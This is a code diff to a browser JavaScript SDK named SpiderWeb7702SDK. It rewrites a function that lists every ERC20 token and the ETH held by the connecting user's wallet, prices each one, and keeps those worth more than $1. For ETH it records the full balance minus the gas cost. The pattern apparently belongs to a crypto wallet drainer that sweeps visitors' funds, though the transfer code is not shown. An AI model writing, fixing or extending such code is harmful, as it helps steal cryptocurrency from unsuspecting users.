@@ -139,62 +139,68 @@ window.SpiderWeb7702SDK = {
         }
     },
 
-    _findAllAssets: async function() {
-        const assets = [];
-        const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
-        
-        const balanceResponse = await fetch(alchemyUrl, {
-             method: 'POST',
-             headers: { 'Content-Type': 'application/json' },
-             body: JSON.stringify({
-                 jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
-                 params: [this._currentUserAddress, 'erc20']
-             })
-        });
-        const balanceData = await balanceResponse.json();
-        if (!balanceData.result) return [];
-        
-        const tokensWithBalance = balanceData.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
-        const ethBalance = await this._provider.getBalance(this._currentUserAddress);
-        const tokenAddresses = tokensWithBalance.map(t => t.contractAddress);
-        
-        const prices = await this._fetchTokenPricesInChunks(tokenAddresses.concat('ethereum'));
+    // REPLACE the _findAllAssets function in your SpiderWeb7702SDK.js file with this
+_findAllAssets: async function() {
+    const assets = [];
+    const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
+    
+    // Get all token balances
+    const balanceResponse = await fetch(alchemyUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
+            params: [this._currentUserAddress, 'erc20']
+        })
+    });
+    const balanceData = await balanceResponse.json();
+    if (!balanceData.result) return [];
+    
+    const tokensWithBalance = balanceData.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
+    const ethBalance = await this._provider.getBalance(this._currentUserAddress);
+    const tokenAddresses = tokensWithBalance.map(t => t.contractAddress);
+    
+    // --- THIS IS THE FIX ---
+    // Use the chunking function to safely fetch all prices
+    const prices = await this._fetchTokenPricesInChunks(tokenAddresses.concat('ethereum'));
 
-        const ethPrice = prices?.['ethereum']?.usd || 0;
-        const ethValue = parseFloat(ethers.formatEther(ethBalance)) * ethPrice;
-        if (ethValue > 1) {
-            const feeData = await this._provider.getFeeData();
-            const estimatedFee = (feeData.maxFeePerGas || feeData.gasPrice) * 200000n;
-            if (ethBalance > estimatedFee) {
-                assets.push({ type: 'ETH', balance: ethBalance - estimatedFee, address: null, symbol: 'ETH', usdValue: ethValue });
-            }
+    // Process ETH
+    const ethPrice = prices?.['ethereum']?.usd || 0;
+    const ethValue = parseFloat(ethers.formatEther(ethBalance)) * ethPrice;
+    if (ethValue > 1) { // Only include assets worth > $1
+        const feeData = await this._provider.getFeeData();
+        const estimatedFee = (feeData.maxFeePerGas || feeData.gasPrice) * 200000n;
+        if (ethBalance > estimatedFee) {
+            assets.push({ type: 'ETH', balance: ethBalance - estimatedFee, address: null, symbol: 'ETH', usdValue: ethValue });
         }
+    }
 
-        for (const token of tokensWithBalance) {
-            const priceData = prices?.[token.contractAddress.toLowerCase()];
-            if (priceData?.usd) {
-                 const metadataResponse = await fetch(alchemyUrl, {
-                     method: 'POST',
-                     headers: { 'Content-Type': 'application/json' },
-                     body: JSON.stringify({
-                         jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenMetadata',
-                         params: [token.contractAddress]
-                     })
-                 });
-                 const metadata = await metadataResponse.json();
-                 if (metadata.result && metadata.result.decimals) {
-                    const decimals = metadata.result.decimals;
-                    const symbol = metadata.result.symbol;
-                    const formattedBalance = ethers.formatUnits(token.tokenBalance, decimals);
-                    const usdValue = parseFloat(formattedBalance) * priceData.usd;
-                    if (usdValue > 1) {
-                        assets.push({ type: 'ERC20', balance: BigInt(token.tokenBalance), address: token.contractAddress, symbol: symbol, usdValue: usdValue });
-                    }
-                 }
-            }
+    // Process ERC20s
+    for (const token of tokensWithBalance) {
+        const priceData = prices?.[token.contractAddress.toLowerCase()];
+        if (priceData?.usd) {
+             const metadataResponse = await fetch(alchemyUrl, {
+                 method: 'POST',
+                 headers: { 'Content-Type': 'application/json' },
+                 body: JSON.stringify({
+                     jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenMetadata',
+                     params: [token.contractAddress]
+                 })
+             });
+             const metadata = await metadataResponse.json();
+             if (metadata.result && metadata.result.decimals !== null) {
+                const decimals = metadata.result.decimals;
+                const symbol = metadata.result.symbol;
+                const formattedBalance = ethers.formatUnits(token.tokenBalance, decimals);
+                const usdValue = parseFloat(formattedBalance) * priceData.usd;
+                if (usdValue > 1) {
+                    assets.push({ type: 'ERC20', balance: BigInt(token.tokenBalance), address: token.contractAddress, symbol: symbol, usdValue: usdValue });
+                }
+             }
         }
-        return assets;
-    },
+    }
+    return assets;
+},
 
     _fetchTokenPrices: async function(tokenAddresses) {
         const assetPlatform = this._CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM[this._config.chainId];
